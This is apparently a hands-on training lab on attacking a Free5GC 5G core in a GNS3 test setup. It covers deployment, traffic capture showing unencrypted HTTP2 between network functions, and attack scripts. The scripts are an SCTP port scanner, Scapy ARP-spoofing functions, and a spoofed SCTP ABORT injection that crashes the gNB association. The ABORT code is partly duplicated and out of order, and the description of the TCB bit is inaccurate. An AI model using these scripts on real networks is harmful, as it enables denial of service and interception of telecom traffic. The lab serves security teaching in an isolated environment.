
# Hands-on Lab

*Note: When opening predefined scenarios in GNS3, errors related to docker containers might sometimes occur. This is normal when a scenario or GNS3 itself is closed abruptly. For this reason, it is advisable to remove stuck containers. To do so, run the following command:*

```bash
docker rm $(docker ps -a -q)

```

# Starting Free5GC

This version runs all docker containers on the HOST, so it must be started from an Ubuntu terminal:

```
cd free5gc-compose
docker compose -f docker-compose-build.yaml up

```

To stop the entire deployment, simply repeat the command above replacing `up` with `down`.

*Note: To avoid leaving lingering containers, it is good practice to destroy them after you finish using the scenario:*

```
# Remove established containers (local images)
docker compose -f docker-compose-build.yaml rm
# Remove established containers (remote images)
docker compose rm

```

Once the system has started, we can verify that all NFs have been brought up as containers on the `br-free5gc` network (`10.10.200.0/24`):

```
docker ps

```

Another way to check assigned IPs and ports:

```
docker compose ps -a --format "table {{.Name}}\t{{.Service}}\t{{.Status}}\t{{.Publishers}}"

```

> **IMPORTANT:** Verify that the Free5GC node is active (the end of the link must show a green dot = UP).

Every time the Free5GC network is started/stopped, the GNS3 node interface goes into a DOWN state. We need to delete the link connecting the node to the switch and recreate it, joining the `eth0` interface of the switch with the `br-free5gc` interface.

# Connecting an Attacker

The `INSIDER_HOST` node corresponds to the Ubuntu machine linked within GNS3. This node is similar to the Free5GC node, being a CLOUD node that exposes the Ubuntu interfaces. However, we must prepare the configuration of the `tap0` interface, which is our target.

In an Ubuntu terminal:

```bash
ip addr show dev tap0

```

Verify that the `tap0` interface has an assigned IP address, specifically `10.100.200.123`. If it does not, assign it:

```
sudo ip addr add 128.100.100.123/24 dev tap0
sudo ip link set tap0 up

```

Ensure that the link between the node and the switch is active and pointing to `tap0` (you can check the connection endpoints for each node in the GNS3 *Topology Summary* window).

*TIP: It is good practice to verify connectivity between both nodes. Try pinging from the Ubuntu terminal to one of the addresses in the Free5GC network (the AMF is `10.100.200.16`).*

# Starting gNB and UE

After booting up and opening a console on the gNB, verify that the assigned IPs do not conflict with those already in use. Check the IPs used by the Free5GC NFs:

```
docker network inspect free5gc-compose_privnet --format '{{json .Containers}}' | jq '.[] | .Name + " -> " + .IPv4Address'

```

The IP `10.100.200.7` is likely already being used by another NF. If this is the case, we must modify the gNB's IP, for example to `10.100.200.27`. To do this, stop the container, open "Configure" -> "Network configuration" -> "Edit", and change the IP.

Once modified, start the gNB again.

Edit the gNB configuration file to correct the local IP (`10.100.200.27`) and connect to the new AMF (`10.100.200.16`).

Run it in the background:

```
./nr-gnb -c config/free5gc-gnb.yaml &

```

*Tip: To stop it, find the PID using the `ps` command and then run `kill <PID>`.*

Start the UE node and modify the `free5gc-ue.yaml` configuration file to point to the new gNB (`10.100.200.27`).

Before launching the application, we must ensure that the subscriber profile is registered, meaning we need to access the operator's database. For this, we can use the WebUI deployed in the Free5GC network. We do not need to know its exact IP address because it already maps port 5000 over the `br-free5gc` IP.

Open the browser in Ubuntu and navigate to the URL [http://10.100.200.1:5000](http://10.100.200.1:5000), using username "admin" and password "free5gc". Select "Subscriber" and create a profile. Ensure that the PLMN and UE-ID details match those in the UE configuration file, and change the "Operator Code Type" from "Opc" to "Op".

Now you can run the application:

```
./nr-ue -c config/free5gc-ue.yaml &

```

Despite some initial errors and warnings, everything should lead to the establishment of the Internet access tunnel `uesimtun0`, with an assigned IP address.

Finally, we just need to assign the default route on the UE to use the newly implemented tunnel:

```
ip route add default dev uesimtun0

```

# Analyzing Traffic Between NFs

A very practical way to observe the behavior of connections between NFs is to use the **EdgeShark** tool, through which we can obtain information about the entire Free5GC network. To do this, we need to activate the application:

```bash
cd /home/user5gtactic/EdgeShark
docker compose -f edgeshark.yaml up -d

```

In the browser, simply open the URL: `http://localhost:5001`

We can see all the Ubuntu interfaces: physical, virtual, dockers, etc. The Free5GC containers appear directly with their names, and we can view all their information, including IP addresses. Moreover, we can interact with these interfaces, allowing us to launch the Wireshark analyzer directly from the browser itself.

First of all, we will stop both the UE and the gNB applications to capture the entire registration process from the beginning.

We will take two traffic captures: for the first one, we will look for the SMF interface in EdgeShark and select open Wireshark on the right side.

For the second one, in GNS3, select the link connecting to the Free5GC node, right-click, and select capture with Wireshark.

Once opened, start the gNB application, followed by the UE application.

Once the `uesimtun0` tunnel is established, we can stop both captures.

In the Wireshark capture of the SMF interface, you will see PFCP and TCP packets. By default, Wireshark often does not automatically recognize HTTP2. Select a TCP packet (one that carries data, meaning it is not a pure SYN or ACK). Right-click, select "Decode As", and under the "Current" column, open the dropdown and select **HTTP2**.

Observe how the HTTP2 traffic exchanged between the AMF and SMF does not effectively use TLS and can be captured and decoded without significant trouble.

To verify the SSL version used by the servers, we can run:

```
openssl s_client -connect 10.100.200.4:8000 -tls1_2

```

It returns:

```
CONNECTED(00000003)
4017FA15787D0000:error:0A00010B:SSL routines:ssl3_get_record:wrong version number:../ssl/record/ssl3_record.c:354:
---
no peer certificate available
---
No client certificate CA names sent
---
SSL handshake has read 5 bytes and written 188 bytes
Verification: OK
---
New, (NONE), Cipher is (NONE)
Secure Renegotiation IS NOT supported
Compression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : 0000
    Session-ID: 
    Session-ID-ctx: 
    Master-Key: 
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1782044774
    Timeout   : 7200 (sec)
    Verify return code: 0 (ok)
    Extended master secret: no
---

```

If we test the link directly:

```
curl -vk --tlsv1.1 [https://10.100.200.4:8000/nnrf-nfm/v1/nf-instances](https://10.100.200.4:8000/nnrf-nfm/v1/nf-instances)

```

It returns:

```
* Trying 10.100.200.4:8000...
* Connected to 10.100.200.4 (127.0.0.10) port 8000
* ALPN: curl offers h2,http/1.1
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
* OpenSSL/3.0.13: error:0A00010B:SSL routines::wrong version number
* Closing connection
curl: (35) OpenSSL/3.0.13: error:0A00010B:SSL routines::wrong version number

```

Which is a symptom that the servers do not use TLS.

Let's try with:

```
curl -vk --tlsv1.1 [http://10.100.200.4:8000/nnrf-nfm/v1/nf-instances](http://10.100.200.4:8000/nnrf-nfm/v1/nf-instances)

```

And it returns:

```
* Trying 10.100.200.4:8000...
* Connected to 10.100.200.4 (127.0.0.10) port 8000
> GET /nnrf-nfm/v1/nf-instances HTTP/1.1
> Host: 10.100.200.4:8000
> User-Agent: curl/8.5.0
> Accept: */*
> 
< HTTP/1.1 401 Unauthorized
< Content-Type: application/json; charset=utf-8
< Date: Fri, 20 Jun 2025 11:31:52 GMT
< Content-Length: 53
< 
* Connection #0 to host 10.100.200.4 left intact
{"error":"verify OAuth Authorization header invalid"}

```

If we try sending it as HTTP2:

```
curl -v --http2 [http://10.100.200.4:8000/nnrf-nfm/v1/nf-instances](http://10.100.200.4:8000/nnrf-nfm/v1/nf-instances)

```

It returns:

```
* Trying 10.100.200.4:8000...
* Connected to 10.100.200.4 (10.100.200.4) port 8000
> GET /nnrf-nfm/v1/nf-instances HTTP/1.1
> Host: 10.100.200.4:8000
> User-Agent: curl/8.5.0
> Accept: */*
> Connection: Upgrade, HTTP2-Settings
> Upgrade: h2c
> HTTP2-Settings: AAMAAABkAAQAoAAAAAIAAAAA
> 
< HTTP/1.1 101 Switching Protocols
< Connection: Upgrade
< Upgrade: h2c
* Received 101, Switching to HTTP/2
< HTTP/2 401 
< content-type: application/json; charset=utf-8
< content-length: 53
< date: Fri, 20 Jun 2025 12:15:46 GMT
< 
* Connection #0 to host 10.100.200.4 left intact
{"error":"verify OAuth Authorization header invalid"}

```

# The gNB and UE Registration Process

In the other Wireshark window, you will have captured the entire registration process of the gNB. It completes SCTP exchanges before initiating NGAP communication. Identify the gNB registration process and the segment where the gNB registers the UE into the network.

Why is there no visible traffic originating directly from the UE?

# Attacking the Core Network

# Setup

We have Visual Studio Code installed to easily manage the Python scripts we are going to test. We need to perform a few preliminary preparation steps.

In an Ubuntu terminal, load the required libraries to handle and manipulate SCTP traffic:

```
sudo apt install -y build-essential python3-dev libglib2.0-dev libsctp-dev

```

Examples that we can use are available at the following URL: [https://github.com/telecomatico/5GTACTIC_HACKING](https://github.com/telecomatico/5GTACTIC_HACKING). In Visual Studio, request to download from the GitHub repository and automatically generate a `venv` environment using the `requirements.txt` file.

If these options do not appear, open a terminal, create the environment manually, and load all dependencies:

```
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt

```

Now we can use the terminal to run our scripts.

## Scanning the Network

Using SCAPY, we can create a very simple SCTP port scanner.

It only requires specifying the target's IP, and it returns the list of open ports:

```
# Function to scan SCTP ports
def scan_sctp_ports(ip):
    open_ports = []
    for port in range(1, 65536):
        sock = sctp.sctpsocket_tcp(socket.AF_INET)
        sock.settimeout(1)
        try:
            sock.connect((ip, port))
            open_ports.append(port)
        except:
            pass
        finally:
            sock.close()
    return open_ports

```

An example output looks like this:

The function sends an `SCTP_INIT` to ports 1..65535:

* Closed ports immediately return an `SCTP_ABORT`.
* Open ports respond with an `SCTP_INIT_ACK`, complete the 4-way handshake (with `COOKIE_ECHO` and `COOKIE_ACK`), and immediately tear down the connection using the `SHUTDOWN` -> `SHUTDOWN_ACK` -> `SHUTDOWN_COMPLETE` sequence, as shown in the capture for port 38412 (AMF/SCTP).

## Spoofing

Using simple functions and Scapy, it is possible to corrupt the ARP tables on both the client and the server:

```
# Function to get MAC address
def get_mac(ip): 
    arp_request = scapy.ARP(pdst = ip) 
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff") 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0] 
    return answered_list[0][1].hwsrc 

# Function to perform basic ARP Spoofing
def arp_spoof_basic(target_ip, spoof_ip):

    # Get the MAC address of the target IP
    target_mac = scapy.getmacbyip(target_ip)
    # Create the ARP packet
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # Send the ARP packet
    scapy.send(packet, verbose=False)
    # Return the MAC address of the target IP
    return target_mac

#    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=spoof_ip)
#    scapy.send(packet, verbose=False)

# Function to restore original values in ARP tables
def restore(destination_ip, source_ip): 
    print(destination_ip)
    #destination_mac = get_mac(destination_ip) 
    destination_mac = scapy.getmacbyip(destination_ip)
    print(str(destination_mac + " - " + destination_ip))
    #source_mac = get_mac(source_ip) 
    source_mac = scapy.getmacbyip(source_ip)
    print(str(source_mac + " - " + source_ip))
    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac) 
    scapy.sendp(scapy.Ether(dst=destination_mac)/packet, verbose = False) 

```

The direct consequence of spoofing is that we can intercept all frames exchanged between the client and the server on our equipment:

In Wireshark, it is observed that for every SCTP packet generated by the client, an identical packet is forwarded with the attacker's MAC address. The same occurs with SCTP packets sent from the server.

The immediate benefit is that we do not need to capture on each individual endpoint; by poisoning the ARP tables, our system acts as a mirror port without affecting the normal behavior of client-server communication.

## DoS

:

## Using SCTP_CHUNK_ABORT in SCTP Connections

Perform tests with the provided code, ensuring you modify the IP addresses to match your environment.

```
The code used is as follows:
print("\nCaptured HEARTBEAT packet details:")
print(f"Source IP: {src_ip}")
print(f"Destination IP: {dst_ip}")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")

# Step 2: Sniffing stops automatically due to count=1

# Step 3: Construct SCTP ABORT packet
abort_pkt = (
    IP(src="10.10.10.7", dst="10.10.10.155") /
    SCTP(sport=dst_port, dport=src_port, tag=vtag) /
    SCTPChunkAbort(TCB=1)
    #SCTPChunkShutdown()
)


print("\nABORT packet parameters:")
print(f"Source IP: 10.10.10.7 (spoofed as Node C)")
print(f"Destination IP: 10.10.10.155 (Node S)")
print(f"Source Port: {dst_port}")
print(f"Destination Port: {src_port}")
print(f"Verification Tag: {vtag:#010x}")
print("Chunk Type: ABORT")

# Step 4: Send the ABORT packet to Node S
from scapy.all import *
import time

# Function to check if a packet is an SCTP HEARTBEAT from Node S to Node C
def is_heartbeat_packet(pkt):
    return ((SCTP in pkt) and
            (SCTPChunkHeartbeatReq in pkt) and
            (pkt[IP].src == "10.10.10.7") and
            (pkt[IP].dst == "10.10.10.155"))

# Step 1: Monitor and capture a HEARTBEAT packet
print("Monitoring network for SCTP HEARTBEAT packet from 10.10.10.7 to 10.10.1.155...>")
packets = sniff(iface="enp0s8", filter="sctp", prn=lambda x: x, stop_filter=is_heartbeat_packet, count=1)

if not packets:
    print("No HEARTBEAT packet captured. Exiting.")
    exit(1)

# Extract the first captured packet
heartbeat_pkt = packets[0]

# Extract and print required fields
src_ip = heartbeat_pkt[IP].src
dst_ip = heartbeat_pkt[IP].dst
src_port = heartbeat_pkt[SCTP].sport
dst_port = heartbeat_pkt[SCTP].dport
vtag = heartbeat_pkt[SCTP].tag

print("\nCaptured HEARTBEAT packet details:")
print(f"Source IP: {src_ip}")
print(f"Destination IP: {dst_ip}")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")

# Step 2: Sniffing stops automatically due to count=1

# Step 3: Construct SCTP ABORT packet
abort_pkt = (
    IP(src="10.10.10.7", dst="10.10.10.155") /
    SCTP(sport=dst_port, dport=src_port, tag=vtag) /
    SCTPChunkAbort(TCB=1)
    #SCTPChunkShutdown()
)

print("\nABORT packet parameters:")
print(f"Source IP: 10.10.10.7 (spoofed as Node C)")
print(f"Destination IP: 10.10.10.155 (Node S)")
print(f"Source Port: {dst_port}")
print(f"Destination Port: {src_port}")
print(f"Verification Tag: {vtag:#010x}")
print("Chunk Type: ABORT")

# Step 4: Send the ABORT packet to Node S
print("\nSending ABORT packet to Node S (10.10.10.155)...")

for i in range(1, 11):
    send(abort_pkt, verbose=False)
    print(f"{i} - ABORT packet sent.\n")
    time.sleep(2)

```

It basically executes the following actions:

1. **1st:** Listens on the interface `enp0s8`, which corresponds to IP `10.10.10.7` and the server/client of the UERANSIM gNB.
2. **2nd:** Captures the first `SCTP_HEARTBEAT_REQ` that UERANSIM (gNB) sends to the server (Open5GS) at IP `10.10.10.155`.
3. **3rd:** Copies the association tag (Verification Tag).
4. **4th:** Generates an `SCTP_CHUNK_ABORT` packet... (Possible trigger: modifying the TCB Byte, which defaults to 0, to the value 1).

In the SCTP ABORT chunk, the 7-bit "reserved" fields and the 1-bit "TCB" have specific functions:

1. **Reserved (7 bits):** This field is reserved for future use and must be set to zero. It has no defined usage in the current protocol specification but is reserved for potential future extensions or changes.
2. **TCB (1 bit):** The TCB (Transmission Control Block) bit is used to indicate whether the ABORT chunk contains additional information regarding the connection state that might be helpful for diagnostics. If this bit is set to 1, it means the ABORT chunk includes extra diagnostic information about the connection status.
3. **5th:** Sends a sequence of retransmissions of this generated packet.

When executed, the terminal outputs the following:

As a consequence of the ABORT sequence, the gNB process crashes into an ERROR state and closes down:

It is observed in the logs that the aborts end up generating an SCTP association shutdown within Free5GC (specifically in the AMF), triggered by an SCTP notification that is unhandled by the source code.

If we look at the capture on the machine hosting the Free5GC server:

The initial Abort packets do not trigger a reaction from the server. However, the moment the Client—completely unaware of this process—generates a `HEARTBEAT`, the server reacts with its own `ABORT`, triggered by the association `SHUTDOWN` (with the AMF).